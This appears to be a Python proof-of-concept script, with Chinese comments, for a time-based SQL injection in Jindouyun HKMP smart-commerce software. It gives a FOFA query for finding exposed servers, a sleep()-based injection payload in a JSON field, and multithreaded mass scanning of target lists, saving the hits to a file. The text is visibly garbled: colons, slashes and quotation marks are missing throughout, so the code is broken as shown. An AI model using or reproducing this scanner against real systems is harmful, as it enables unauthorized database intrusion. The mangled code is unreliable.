#金斗云 HKMP智慧商业软件存在SQL注入漏洞复现
#FOFA body=金斗云 Copyright
import sys  
import requests  
import argparse  
from multiprocessing.dummy import Pool  

requests.packages.urllib3.disable_warnings()  

def main()  
    parse = argparse.ArgumentParser(description='金斗云 HKMP智慧商业软件存在SQL注入漏洞复现')  
    parse.add_argument('-u', '--url', dest='url', type=str, help='输入url')  
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入文件名')  
    args = parse.parse_args()  

    if args.url and not args.file  
        poc(args.url)  
    elif args.file and not args.url  
        url_list = []  
        with open(args.file, 'r', encoding='utf-8') as f  
            for line in f.readlines()
                url_list.append(line.strip()) 
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()  
    else  
        print(请提供一个URL或文件名。)  

def poc(target)  
    payload = adminconfigAppqueryPrintTemplate  
    data =  {appIdhkmp,data{adminUserCodetest1234,adminUserNametest1234,appName悟空POS Win版' AND (SELECt 5 from (select(sleep(2)))x) and 'zz'='zz,configGroup1,mchId0001},deviceIdhkmp,mchIdhkmp,nonce3621722933,signhkmp,timestamp1719306504}


     
    
    headers = {  
        'User-Agent' 'Mozilla5.0 (Windows NT 10.0; Win64; x64) AppleWebKit537.36 (KHTML, like Gecko) Chrome119.0.6045.159 Safari537.36',  
        'Accept' 'texthtml,applicationxhtml+xml,applicationxml;q=0.9,imageavif,imagewebp,imageapng,;q=0.8,applicationsigned-exchange;v=b3;q=0.7',  
        'Content-Type' 'applicationjson'  
    }  

    proxy={
    'http' 'http127.0.0.17890',
    'https' 'http127.0.0.17890'
}
    
    try  
          
        res1 = requests.post(url=target + payload, timeout=10, verify=False, headers=headers, data='',proxies=proxy)  
        time1 = res1.elapsed.total_seconds()  

         
        res2 = requests.post(url=target + payload, headers=headers, timeout=10, verify=False, json=data,proxies=proxy)  
        time2 = res2.elapsed.total_seconds()  

        # print(f{target}响应时间 基准={time1}, 注入={time2})  

        # 检查时间差是否表明SQL注入漏洞  
        if time2 - time1 = 4.8   
            print(f{target} 存在SQL注入)  
            with open('result.txt', 'a', encoding='utf-8') as f  
                f.write(target + 'n')  
    except requests.exceptions.RequestException as e  
       pass 

if __name__ == '__main__'  
    main()